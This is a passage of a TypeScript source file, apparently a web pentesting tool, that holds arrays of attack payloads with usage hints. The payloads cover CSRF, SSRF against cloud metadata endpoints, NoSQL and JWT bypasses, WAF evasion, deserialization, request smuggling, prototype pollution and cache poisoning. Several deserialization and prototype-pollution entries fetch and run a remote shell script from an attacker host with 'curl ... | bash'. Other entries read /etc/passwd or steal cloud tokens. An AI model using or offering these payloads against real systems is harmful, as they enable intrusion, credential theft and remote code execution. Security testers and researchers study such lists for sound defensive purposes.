      description: "Basic CSRF attack using HTML form",
      usage: "Host on attacker site and trick admin into clicking"
    },
    {
      name: "Auto-submit CSRF",
      category: "Auto-submit",
      payload: "<form id=\"csrf\" action=\"http://vulnerable-site.com/admin/change-password\" method=\"POST\"><input type=\"hidden\" name=\"new_password\" value=\"hacked123\"></form><script>document.getElementById('csrf').submit();</script>",
      description: "Auto-submitting CSRF form",
      usage: "Executes automatically when page loads"
    },
    {
      name: "CSRF via Image",
      category: "Image-based",
      payload: "<img src=\"http://vulnerable-site.com/admin/delete-user?user_id=123\" style=\"display:none\">",
      description: "CSRF attack using image tag for GET requests",
      usage: "Works for GET-based state-changing operations"
    },
    {
      name: "AJAX CSRF",
      category: "AJAX",
      payload: "<script>fetch('http://vulnerable-site.com/api/admin/promote-user', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({user_id: 123, role: 'admin'})});</script>",
      description: "CSRF attack using AJAX/fetch",
      usage: "Works when CORS is misconfigured"
    },
    {
      name: "CSRF Token Bypass",
      category: "Token Bypass",
      payload: "<form action=\"http://vulnerable-site.com/admin/action\" method=\"POST\"><input type=\"hidden\" name=\"csrf_token\" value=\"\"><input type=\"hidden\" name=\"action\" value=\"delete_all\"></form>",
      description: "CSRF with empty token (bypass attempt)",
      usage: "Some applications accept empty CSRF tokens"
    },
    {
      name: "CSRF JSON POST",
      category: "JSON",
      payload: "<form action=\"http://vulnerable-site.com/api/update\" method=\"POST\" enctype=\"text/plain\"><input name='{\"email\":\"attacker@evil.com\",\"role\":\"admin\",\"ignore\":\"' value='value\"}' type='hidden'></form><script>document.forms[0].submit();</script>",
      description: "CSRF with JSON payload using text/plain encoding",
      usage: "Bypass CORS/Content-Type checks"
    },
    {
      name: "CSRF via WebSocket",
      category: "WebSocket",
      payload: "<script>ws=new WebSocket('ws://vulnerable-site.com/socket');ws.onopen=()=>ws.send(JSON.stringify({action:'delete_user',id:123}));</script>",
      description: "CSRF attack via WebSocket connection",
      usage: "WebSocket connections don't enforce CORS"
    },
    {
      name: "CSRF Clickjacking Combo",
      category: "Clickjacking",
      payload: "<iframe src=\"http://vulnerable-site.com/admin/delete\" style=\"opacity:0;position:absolute;top:0;left:0;width:100%;height:100%\"></iframe><button style=\"position:relative;z-index:1\">Click for prize!</button>",
      description: "Combine CSRF with clickjacking",
      usage: "Trick user into clicking invisible iframe"
    },
    {
      name: "CSRF SameSite Bypass",
      category: "SameSite Bypass",
      payload: "<form method=\"POST\" action=\"http://vulnerable-site.com/api/update\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"></form><script>window.open('http://vulnerable-site.com');setTimeout(()=>document.forms[0].submit(),1000);</script>",
      description: "Bypass SameSite=Lax cookie protection",
      usage: "Open same-site window first, then submit"
    },
    {
      name: "CSRF via Flash",
      category: "Flash",
      payload: "var request = new URLRequest('http://vulnerable-site.com/api/delete');request.method = URLRequestMethod.POST;var variables = new URLVariables();variables.user_id=123;request.data=variables;var loader = new URLLoader();loader.load(request);",
      description: "CSRF using Flash crossdomain.xml",
      usage: "Historical attack, works if Flash is enabled"
    }
  ]

  // Advanced Web Attacks - SSRF Payloads
  const ssrfPayloads: Payload[] = [
    {
      name: "Basic SSRF",
      category: "Basic SSRF",
      payload: "http://localhost:80/admin",
      description: "Basic SSRF to access internal services",
      usage: "Use in URL parameters that fetch external resources"
    },
    {
      name: "Cloud Metadata Access",
      category: "Cloud",
      payload: "http://169.254.169.254/latest/meta-data/",
      description: "AWS metadata service access via SSRF",
      usage: "Can reveal AWS credentials and instance info"
    },
    {
      name: "Internal Network Scan",
      category: "Network Scan",
      payload: "http://192.168.1.1:80/",
      description: "Scan internal network via SSRF",
      usage: "Enumerate internal services and hosts"
    },
    {
      name: "File Protocol SSRF",
      category: "File Access",
      payload: "file:///etc/passwd",
      description: "Access local files via file:// protocol",
      usage: "Read sensitive files on the target system"
    },
    {
      name: "Gopher SSRF",
      category: "Protocol Abuse",
      payload: "gopher://localhost:6379/_*1%0d%0a$4%0d%0aquit%0d%0a",
      description: "Redis attack via Gopher protocol SSRF",
      usage: "Attack internal services like Redis, MySQL"
    },
    {
      name: "DNS Rebinding",
      category: "DNS Rebinding",
      payload: "http://7f000001.attacker.com/",
      description: "DNS rebinding attack to bypass filters",
      usage: "Domain resolves to 127.0.0.1 after initial request"
    },
    {
      name: "IPv6 Localhost",
      category: "IPv6",
      payload: "http://[::1]:80/admin",
      description: "Access localhost via IPv6",
      usage: "Bypass IPv4-only SSRF filters"
    },
    {
      name: "URL Fragment Bypass",
      category: "URL Manipulation",
      payload: "http://attacker.com@localhost:80/",
      description: "Use URL credentials syntax to bypass filters",
      usage: "Some parsers may ignore the @localhost part"
    },
    {
      name: "Cloud Metadata GCP",
      category: "Cloud",
      payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      description: "Access GCP metadata and service account tokens",
      usage: "Add header: Metadata-Flavor: Google"
    },
    {
      name: "Cloud Metadata Azure",
      category: "Cloud",
      payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      description: "Access Azure instance metadata",
      usage: "Add header: Metadata: true"
    },
    {
      name: "SSRF via PDF Generator",
      category: "PDF",
      payload: "<iframe src=\"file:///etc/passwd\" width=\"1\" height=\"1\"></iframe>",
      description: "SSRF via HTML to PDF conversion",
      usage: "Inject HTML that PDF generator will render"
    },
    {
      name: "SSRF via XXE Combo",
      category: "Combo",
      payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:6379/\">]><foo>&xxe;</foo>",
      description: "Combine XXE with SSRF to access internal services",
      usage: "Upload XML to trigger both vulnerabilities"
    },
    {
      name: "SSRF Redis Exploitation",
      category: "Redis",
      payload: "dict://localhost:6379/INFO",
      description: "Access Redis using dict:// protocol",
      usage: "Extract Redis information via SSRF"
    },
    {
      name: "SSRF via SVG",
      category: "SVG",
      payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><image href=\"http://169.254.169.254/latest/meta-data/\" /></svg>",
      description: "SSRF via SVG image href",
      usage: "Upload SVG file with internal URL"
    },
    {
      name: "SSRF Localhost Bypass Variations",
      category: "Bypass",
      payload: "http://127.1, http://0.0.0.0, http://[::], http://2130706433",
      description: "Alternative representations of localhost",
      usage: "127.1=127.0.0.1, 2130706433=decimal IP"
    }
  ]

  // NoSQL Injection
  const nosqlPayloads: Payload[] = [
    {
      name: "MongoDB Authentication Bypass",
      category: "MongoDB",
      payload: "username[$ne]=admin&password[$ne]=admin",
      description: "MongoDB authentication bypass using $ne operator",
      usage: "Use in login forms with MongoDB backend"
    },
    {
      name: "MongoDB Data Extraction",
      category: "MongoDB",
      payload: "username[$regex]=.*&password[$regex]=.*",
      description: "Extract data using MongoDB regex operator",
      usage: "Enumerate users by pattern matching"
    },
    {
      name: "MongoDB JavaScript Injection",
      category: "MongoDB",
      payload: "username=admin&password[$where]=function(){return true}",
      description: "JavaScript injection in MongoDB where clause",
      usage: "Execute arbitrary JavaScript in MongoDB context"
    },
    {
      name: "CouchDB All Docs",
      category: "CouchDB",
      payload: "/_all_dbs",
      description: "CouchDB database enumeration",
      usage: "List all databases in CouchDB"
    },
    {
      name: "Cassandra Injection",
      category: "Cassandra",
      payload: "admin' ALLOW FILTERING--",
      description: "Cassandra CQL injection with ALLOW FILTERING",
      usage: "Bypass query restrictions in Cassandra"
    },
    {
      name: "Redis Command Injection",
      category: "Redis",
      payload: "key\\r\\nFLUSHALL\\r\\n",
      description: "Redis command injection via key parameter",
      usage: "Execute Redis commands through CRLF injection"
    },
    {
      name: "MongoDB Timing Attack",
      category: "MongoDB",
      payload: "username=admin&password[$regex]=^a.*&password[$options]=i",
      description: "Extract password character by character using regex timing",
      usage: "Brute force password by testing each character"
    },
    {
      name: "MongoDB OR Injection",
      category: "MongoDB",
      payload: "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
      description: "Boolean injection using $gt operator",
      usage: "Bypass authentication with always-true condition"
    },
    {
      name: "MongoDB Array Injection",
      category: "MongoDB",
      payload: "username[$in][]=admin&username[$in][]=user&password=pass",
      description: "Test multiple values using $in operator",
      usage: "Enumerate valid usernames"
    },
    {
      name: "CouchDB Admin Access",
      category: "CouchDB",
      payload: "/_users/org.couchdb.user:admin",
      description: "Access CouchDB admin user document",
      usage: "Retrieve admin credentials hash"
    },
    {
      name: "MongoDB Sleep DOS",
      category: "MongoDB",
      payload: "username=admin&password[$where]=sleep(5000)",
      description: "Cause delay with JavaScript sleep",
      usage: "Confirm blind injection with timing"
    }
  ]

  // GraphQL Injection Payloads
  const graphqlPayloads: Payload[] = [
    {
      name: "Introspection Query",
      category: "Introspection",
      payload: "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }",
      description: "Full GraphQL schema introspection",
      usage: "Discover available queries, mutations, and types"
    },
    {
      name: "Query Depth Attack",
      category: "DoS",
      payload: "query { user { posts { comments { replies { replies { replies { replies { id } } } } } } } }",
      description: "Deep nested query to cause DoS",
      usage: "Exploit recursive relationships for resource exhaustion"
    },
    {
      name: "Query Alias Attack",
      category: "DoS",
      payload: "query { alias1: users { id } alias2: users { id } alias3: users { id } alias4: users { id } alias5: users { id } }",
      description: "Multiple aliases to amplify query cost",
      usage: "Execute same expensive query multiple times"
    },
    {
      name: "Field Suggestion Attack",
      category: "Information Disclosure",
      payload: "query { user { invalidFieldName } }",
      description: "Trigger field suggestions in error messages",
      usage: "Error messages may reveal available field names"
    },
    {
      name: "Union Type Abuse",
      category: "Information Disclosure",
      payload: "query { search(term: \"test\") { ... on User { id email admin } ... on Post { id content private } } }",
      description: "Access different types through union queries",
      usage: "May reveal fields not intended for current user"
    },
    {
      name: "Mutation Chaining",
      category: "Privilege Escalation",
      payload: "mutation { createPost(title: \"test\", content: \"test\") { id } promoteUser(userId: 1, role: ADMIN) { id role } }",
      description: "Chain mutations for privilege escalation",
      usage: "Execute privileged operations in sequence"
    },
    {
      name: "Batch Query Attack",
      category: "DoS",
      payload: "[{\"query\":\"{ users { id name } }\"},{\"query\":\"{ users { id name } }\"},{\"query\":\"{ users { id name } }\"}]",
      description: "Send multiple queries in single request",
      usage: "Batch 100+ queries to overwhelm server"
    },
    {
      name: "Field Duplication DOS",
      category: "DoS",
      payload: "query { user(id:1) { name name name name name name name } }",
      description: "Request same field multiple times",
      usage: "Amplify response size and processing"
    },
    {
      name: "GraphQL IDOR",
      category: "IDOR",
      payload: "query { user(id: 999) { email ssn creditCard } }",
      description: "Access other users' sensitive data",
      usage: "Test different user IDs for access control issues"
    },
    {
      name: "Directive Overload",
      category: "DoS",
      payload: "query @skip(if: true) @skip(if: true) @skip(if: true) { users { id } }",
      description: "Abuse directive processing",
      usage: "Add excessive directives to queries"
    },
    {
      name: "GraphQL Injection in Variables",
      category: "Injection",
      payload: "{\"id\": \"1 UNION SELECT * FROM users--\"}",
      description: "Inject SQL/NoSQL in GraphQL variables",
      usage: "Variables may not be properly sanitized"
    }
  ]

  // JWT Manipulation Payloads
  const jwtPayloads: Payload[] = [
    {
      name: "Algorithm None Attack",
      category: "Algorithm Attack",
      payload: "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
      description: "JWT with algorithm set to 'none' to bypass signature verification",
      usage: "Remove signature and set alg to none"
    },
    {
      name: "HMAC Key Confusion",
      category: "Algorithm Attack",
      payload: "Use public key as HMAC secret",
      description: "When RS256 is used, try using the public key as HMAC-SHA256 secret",
      usage: "Convert RS256 token to HS256 using public key"
    },
    {
      name: "Weak Secret Brute Force",
      category: "Secret Attack",
      payload: "Common secrets: secret, password, key, jwt, token, 123456",
      description: "Common weak secrets used in JWT signing",
      usage: "Try common passwords as HMAC secrets"
    },
    {
      name: "Kid Parameter Injection",
      category: "Parameter Injection",
      payload: "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../public.key\"}",
      description: "Path traversal in kid parameter to load arbitrary keys",
      usage: "Manipulate kid parameter for key confusion attacks"
    },
    {
      name: "JKU URL Manipulation",
      category: "Parameter Injection",
      payload: "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"http://attacker.com/jwks.json\"}",
      description: "Point JKU to attacker-controlled JWKS endpoint",
      usage: "Host malicious JWKS with controlled keys"
    },
    {
      name: "SQL Injection in Claims",
      category: "Injection",
      payload: "{\"sub\":\"admin' OR '1'='1\",\"role\":\"user\"}",
      description: "SQL injection payload in JWT claims",
      usage: "When JWT claims are used in SQL queries"
    },
    {
      name: "X5U URL Manipulation",
      category: "Parameter Injection",
      payload: "{\"alg\":\"RS256\",\"x5u\":\"http://attacker.com/cert.crt\"}",
      description: "Point x5u to attacker's certificate",
      usage: "Host malicious certificate for signature bypass"
    },
    {
      name: "Kid SQL Injection",
      category: "Parameter Injection",
      payload: "{\"kid\":\"' UNION SELECT 'key123' --\"}",
      description: "SQL injection in kid parameter",
      usage: "When kid is used in database lookup"
    },
    {
      name: "Null Signature",
      category: "Algorithm Attack",
      payload: "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.AAAA",
      description: "Set signature to null bytes",
      usage: "Some implementations accept null signatures"
    },
    {
      name: "JWT Expiration Bypass",
      category: "Time Attack",
      payload: "{\"exp\": 9999999999}",
      description: "Set far future expiration date",
      usage: "Create long-lived tokens"
    },
    {
      name: "Audience Confusion",
      category: "Claims Attack",
      payload: "{\"aud\": [\"api.example.com\", \"admin.example.com\"]}",
      description: "Add multiple audiences for privilege escalation",
      usage: "Reuse tokens across different services"
    },
    {
      name: "JWT JWKS Confusion",
      category: "Algorithm Attack",
      payload: "Convert RSA public key to symmetric key format",
      description: "Exploit asymmetric to symmetric algorithm confusion",
      usage: "Use tools like jwt_tool for conversion"
    }
  ]

  // Directory Enumeration Wordlists
  const directoryWordlists: Payload[] = [
    {
      name: "Common Directories",
      category: "Standard",
      payload: "admin,administrator,login,dashboard,panel,wp-admin,wp-content,uploads,images,css,js,api,v1,v2,backup,backups,old,tmp,temp,test,dev,staging",
      description: "Common directory names for enumeration",
      usage: "Use with directory brute force tools"
    },
    {
      name: "Configuration Files",
      category: "Config Files",
      payload: ".env,.htaccess,web.config,config.php,settings.py,application.properties,database.yml,secrets.json",
      description: "Common configuration file names",
      usage: "Look for exposed configuration files"
    },
    {
      name: "Backup File Extensions",
      category: "Backups",
      payload: ".bak,.backup,.old,.orig,.save,.tmp,.swp,~,.copy",
      description: "Common backup file extensions",
      usage: "Find backup versions of files"
    },
    {
      name: "Source Code Files",
      category: "Source Code",
      payload: ".php.bak,index.php~,config.php.old,.git/config,.svn/entries,composer.json,package.json",
      description: "Common source code disclosure patterns",
      usage: "Find exposed source code files"
    }
  ]

  // Technology Fingerprinting
  const fingerprintingTechniques: Payload[] = [
    {
      name: "HTTP Headers Analysis",
      category: "Headers",
      payload: "Check Server, X-Powered-By, X-AspNet-Version, X-Generator headers",
      description: "Identify technology stack from HTTP headers",
      usage: "Examine response headers for technology indicators"
    },
    {
      name: "Error Page Fingerprinting",
      category: "Error Pages",
      payload: "404.php, 500.asp, error.jsp, default.aspx",
      description: "Technology identification from error pages",
      usage: "Request non-existent files to trigger error pages"
    },
    {
      name: "Cookie Analysis",
      category: "Cookies",
      payload: "PHPSESSID (PHP), JSESSIONID (Java), ASPXAUTH (.NET), connect.sid (Node.js)",
      description: "Identify technology from session cookie names",
      usage: "Examine Set-Cookie headers for technology signatures"
    },
    {
      name: "URL Pattern Analysis",
      category: "URL Patterns",
      payload: ".php, .asp, .aspx, .jsp, .do, .action, /api/v1/, /graphql",
      description: "Technology identification from URL patterns",
      usage: "Analyze URL structure and file extensions"
    }
  ]

  // CMS-Specific Tests
  const cmsPayloads: Payload[] = [
    {
      name: "WordPress Version Detection",
      category: "WordPress",
      payload: "/wp-includes/version.php, /readme.html, /wp-json/wp/v2/",
      description: "WordPress version and API discovery",
      usage: "Identify WordPress version and exposed endpoints"
    },
    {
      name: "WordPress User Enumeration",
      category: "WordPress",
      payload: "/?author=1, /wp-json/wp/v2/users/, /?rest_route=/wp/v2/users",
      description: "Enumerate WordPress users",
      usage: "Discover WordPress user accounts"
    },
    {
      name: "Drupal Version Detection",
      category: "Drupal",
      payload: "/CHANGELOG.txt, /core/CHANGELOG.txt, /sites/default/settings.php",
      description: "Drupal version identification and config access",
      usage: "Identify Drupal version and potential misconfigurations"
    },
    {
      name: "Joomla Component Discovery",
      category: "Joomla",
      payload: "/administrator/, /components/, /modules/, /plugins/, /templates/",
      description: "Joomla structure and component enumeration",
      usage: "Discover Joomla components and admin interface"
    },
    {
      name: "Magento Admin Path",
      category: "Magento",
      payload: "/admin, /backend, /administrator, /admin_*, /magento_admin",
      description: "Common Magento admin panel paths",
      usage: "Locate Magento admin interface"
    }
  ]

  // API Discovery Techniques
  const apiDiscoveryPayloads: Payload[] = [
    {
      name: "REST API Common Paths",
      category: "REST API",
      payload: "/api, /api/v1, /api/v2, /rest, /graphql, /swagger, /openapi.json",
      description: "Common REST API endpoint patterns",
      usage: "Discover API endpoints and documentation"
    },
    {
      name: "API Documentation URLs",
      category: "Documentation",
      payload: "/docs, /api-docs, /swagger-ui, /redoc, /graphiql, /playground",
      description: "Common API documentation interfaces",
      usage: "Find interactive API documentation"
    },
    {
      name: "Mobile API Endpoints",
      category: "Mobile API",
      payload: "/mobile/api, /app/api, /m/api, /api/mobile, /services/mobile",
      description: "Mobile-specific API endpoints",
      usage: "Often have different security controls"
    },
    {
      name: "Internal API Discovery",
      category: "Internal API",
      payload: "/internal, /private, /admin/api, /staff/api, /employee/api",
      description: "Internal API endpoint patterns",
      usage: "May have reduced authentication requirements"
    }
  ]

  // WAF Bypass Techniques
  const wafBypassPayloads: Payload[] = [
    {
      name: "Case Variation",
      category: "Case Bypass",
      payload: "SeLeCt * FrOm UsErS",
      description: "Mixed case to bypass simple filters",
      usage: "Alternate uppercase and lowercase letters"
    },
    {
      name: "Comment Insertion",
      category: "Comment Bypass",
      payload: "SEL/**/ECT * FR/**/OM users",
      description: "Insert comments to break detection patterns",
      usage: "Use /* */ comments in SQL keywords"
    },
    {
      name: "URL Encoding",
      category: "Encoding",
      payload: "%53%45%4c%45%43%54%20%2a%20%46%52%4f%4d%20%75%73%65%72%73",
      description: "URL encode payload to bypass string matching",
      usage: "Encode special characters and keywords"
    },
    {
      name: "Double URL Encoding",
      category: "Double Encoding",
      payload: "%2553%2545%254c%2545%2543%2554",
      description: "Double encode to bypass decode-once filters",
      usage: "Encode already encoded characters"
    },
    {
      name: "Unicode Normalization",
      category: "Unicode",
      payload: "ＳＥＬ⁁ⁿCT * FROM users",
      description: "Unicode characters that normalize to ASCII",
      usage: "Use Unicode equivalents of ASCII characters"
    },
    {
      name: "Parameter Pollution",
      category: "HTTP Parameter Pollution",
      payload: "?id=1&id=2 UNION SELECT",
      description: "Use multiple parameters with same name",
      usage: "Different servers handle duplicates differently"
    },
    {
      name: "Chunked Encoding",
      category: "HTTP Chunking",
      payload: "Split payload across multiple chunks",
      description: "Use HTTP chunked transfer encoding",
      usage: "May bypass content inspection filters"
    },
    {
      name: "Newline Injection",
      category: "Line Breaking",
      payload: "SELECT%0a*%0dFROM%0ausers",
      description: "Insert newlines to break pattern matching",
      usage: "Use \\n (LF) and \\r (CR) characters"
    }
  ]

  // Polyglot Payload Generation
  const polyglotPayloads: Payload[] = [
    {
      name: "SQL/XSS Polyglot",
      category: "Multi-Context",
      payload: "'><script>alert('XSS')</script><!--' AND '1'='1",
      description: "Works in both SQL and XSS contexts",
      usage: "Test multiple vulnerability types simultaneously"
    },
    {
      name: "Command/SQL Polyglot",
      category: "Multi-Context",
      payload: "'; cat /etc/passwd; echo '1'='1",
      description: "Works in both command injection and SQL contexts",
      usage: "Exploit multiple injection types"
    },
    {
      name: "XSS/Template Polyglot",
      category: "Multi-Context",
      payload: "{{constructor.constructor('alert(1)')()}}<script>alert('XSS')</script>",
      description: "Works in template engines and XSS contexts",
      usage: "Test both template injection and XSS"
    },
    {
      name: "JSON/XML Polyglot",
      category: "Format Agnostic",
      payload: "<!--{\"test\":\"<script>alert('XSS')</script>\"}-->",
      description: "Valid in both JSON and XML parsers",
      usage: "When input format is uncertain"
    }
  ]

  // Deserialization Attack Payloads
  const deserializationPayloads: Payload[] = [
    {
      name: "Java ysoserial CommonsCollections1",
      category: "Java",
      payload: "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5UcmFuc2Zvcm1pbmdDb21wYXJhdG9y",
      description: "Java deserialization RCE using Apache Commons Collections",
      usage: "Base64 encoded serialized object for Java applications"
    },
    {
      name: "Python Pickle RCE",
      category: "Python",
      payload: "cos\\nsystem\\n(S'curl http://attacker.com/shell.sh | bash'\\ntR.",
      description: "Python pickle deserialization for command execution",
      usage: "Works with pickle.loads() in Python applications"
    },
    {
      name: "PHP Unserialize Object Injection",
      category: "PHP",
      payload: "O:8:\"stdClass\":1:{s:4:\"file\";s:11:\"/etc/passwd\";}",
      description: "PHP object injection via unserialize",
      usage: "Manipulate object properties for file read/inclusion"
    },
    {
      name: ".NET TypeConfuseDelegate",
      category: ".NET",
      payload: "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00",
      description: ".NET deserialization RCE via BinaryFormatter",
      usage: "Base64 encoded .NET serialized payload"
    },
    {
      name: "Ruby Marshal RCE",
      category: "Ruby",
      payload: "\\x04\\x08o:\\x0bSystem\\x06:\\x06@\\x0fwhoami",
      description: "Ruby Marshal.load exploitation for command execution",
      usage: "Works with Marshal.load in Ruby applications"
    },
    {
      name: "Node.js node-serialize RCE",
      category: "Node.js",
      payload: "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://attacker.com/shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) });}()\"}",
      description: "Node.js deserialization via node-serialize package",
      usage: "Exploits IIFE in node-serialize deserialization"
    }
  ]

  // HTTP Request Smuggling Payloads
  const smugglingPayloads: Payload[] = [
    {
      name: "CL.TE Basic Smuggling",
      category: "CL.TE",
      payload: "POST / HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED",
      description: "Content-Length followed by Transfer-Encoding desync",
      usage: "Front-end uses CL, back-end uses TE"
    },
    {
      name: "TE.CL Basic Smuggling",
      category: "TE.CL",
      payload: "POST / HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n5c\\r\\nSMUGGLED\\r\\n0\\r\\n\\r\\n",
      description: "Transfer-Encoding followed by Content-Length desync",
      usage: "Front-end uses TE, back-end uses CL"
    },
    {
      name: "TE.TE Obfuscated Chunked",
      category: "TE.TE",
      payload: "POST / HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-Encoding: x\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED",
      description: "Multiple Transfer-Encoding headers causing desync",
      usage: "One server ignores obfuscated TE header"
    },
    {
      name: "Cache Poisoning via Smuggling",
      category: "Advanced",
      payload: "POST / HTTP/1.1\\r\\nHost: vulnerable-website.com\\r\\nContent-Length: 150\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET /static/include.js HTTP/1.1\\r\\nHost: evil.com\\r\\nFoo: bar",
      description: "Smuggle request to poison cache with malicious response",
      usage: "Redirect cached resources to attacker-controlled server"
    }
  ]

  // OAuth & SAML Attack Payloads
  const oauthPayloads: Payload[] = [
    {
      name: "OAuth Redirect URI Bypass",
      category: "OAuth",
      payload: "https://vulnerable-app.com/callback/../oauth?redirect_uri=https://attacker.com",
      description: "Bypass redirect_uri validation using path traversal",
      usage: "Steal authorization codes by manipulating redirect"
    },
    {
      name: "OAuth State CSRF",
      category: "OAuth",
      payload: "https://oauth-provider.com/authorize?client_id=CLIENT_ID&redirect_uri=https://client.com/callback&response_type=code",
      description: "Missing state parameter allows CSRF during OAuth flow",
      usage: "Force victim to authenticate with attacker's account"
    },
    {
      name: "SAML Assertion Injection",
      category: "SAML",
      payload: "<saml:Assertion><saml:Subject><saml:NameID>admin@victim.com</saml:NameID></saml:Subject></saml:Assertion>",
      description: "Inject arbitrary user claims in SAML assertion",
      usage: "Forge SAML response to impersonate users"
    },
    {
      name: "JWT to SAML Confusion",
      category: "Token Confusion",
      payload: "{\"typ\":\"SAML\",\"alg\":\"none\"}",
      description: "Confuse application by sending JWT when SAML expected",
      usage: "Exploit weak token validation logic"
    },
    {
      name: "OAuth Token Scope Escalation",
      category: "OAuth",
      payload: "scope=read_profile+write_profile+admin+delete_user",
      description: "Request unauthorized scopes in OAuth flow",
      usage: "Test for weak scope validation"
    }
  ]

  // WebSocket Attack Payloads
  const websocketPayloads: Payload[] = [
    {
      name: "WebSocket CSRF (CSWSH)",
      category: "CSRF",
      payload: "<script>var ws = new WebSocket('wss://vulnerable.com/socket');ws.onopen = function(){ws.send('{\"action\":\"transfer\",\"amount\":1000}');};</script>",
      description: "Cross-Site WebSocket Hijacking attack",
      usage: "Execute unauthorized WebSocket actions from malicious site"
    },
    {
      name: "WebSocket Message Injection",
      category: "Injection",
      payload: "{\"type\":\"chat\",\"message\":\"<script>alert(document.cookie)</script>\"}",
      description: "Inject XSS payload through WebSocket message",
      usage: "Exploit insufficient message sanitization"
    },
    {
      name: "WebSocket Smuggling",
      category: "Smuggling",
      payload: "GET / HTTP/1.1\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\nSec-WebSocket-Key: x\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\n",
      description: "Smuggle HTTP request through WebSocket upgrade",
      usage: "Bypass access controls via protocol smuggling"
    }
  ]

  // Prototype Pollution Payloads
  const prototypePayloads: Payload[] = [
    {
      name: "Constructor Prototype Pollution",
      category: "Object",
      payload: "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
      description: "Pollute Object prototype via constructor property",
      usage: "Escalate privileges by injecting properties"
    },
    {
      name: "__proto__ Pollution",
      category: "Object",
      payload: "{\"__proto__\":{\"admin\":true,\"role\":\"administrator\"}}",
      description: "Direct prototype pollution using __proto__",
      usage: "Add arbitrary properties to all objects"
    },
    {
      name: "Array Prototype Pollution",
      category: "Array",
      payload: "{\"__proto__\":[\"injected\",\"values\"]}",
      description: "Pollute Array prototype with controlled values",
      usage: "Affect array operations application-wide"
    },
    {
      name: "Prototype Pollution RCE (Node.js)",
      category: "RCE",
      payload: "{\"__proto__\":{\"execArgv\":[\"--eval=require('child_process').exec('curl http://attacker.com/shell.sh | bash')\"]}}",
      description: "Achieve RCE via prototype pollution in Node.js",
      usage: "Exploit child_process options pollution"
    },
    {
      name: "Client-Side Prototype Pollution XSS",
      category: "XSS",
      payload: "?__proto__[innerHTML]=<img src=x onerror=alert(document.cookie)>",
      description: "DOM XSS via prototype pollution in browser",
      usage: "Pollute DOM properties to trigger XSS"
    }
  ]

  // Web Cache Poisoning Payloads
  const cachePayloads: Payload[] = [
    {
      name: "Cache Poisoning - Unkeyed Header",
      category: "Header Injection",
      payload: "X-Forwarded-Host: evil.com",
      description: "Poison cache using unkeyed header",
      usage: "Set in request to cache malicious responses"
    },
    {
      name: "Cache Poisoning - Host Header",
      category: "Host Injection",
      payload: "Host: evil.com",
      description: "Inject malicious host to poison cached URLs",
      usage: "Cache will serve content from attacker domain"
    },
    {
      name: "Cache Key Manipulation",
      category: "Key Injection",
      payload: "GET /api/data?param=value%0d%0aX-Forwarded-Host:evil.com HTTP/1.1",
      description: "Inject headers via CRLF in cache key",
      usage: "Manipulate cached response for specific keys"
    },
    {
      name: "Web Cache Deception",
      category: "Path Confusion",
      payload: "https://victim.com/profile/settings/..%2fstatic%2finnocent.css",
      description: "Cache sensitive page as static resource",
      usage: "Trick cache into storing authenticated content"
    },
    {
      name: "Fat GET Request Cache Poisoning",
      category: "Body Injection",
      payload: "GET /api HTTP/1.1\\r\\nHost: vulnerable.com\\r\\nContent-Length: 50\\r\\n\\r\\n{\"callback\":\"https://evil.com/malicious.js\"}",
      description: "Send GET with body to poison cache",
      usage: "Exploit servers that process GET request bodies"
    }
  ]

  // Race Condition Payloads
  const racePayloads: Payload[] = [
    {
      name: "Parallel Request Race",
      category: "TOCTOU",
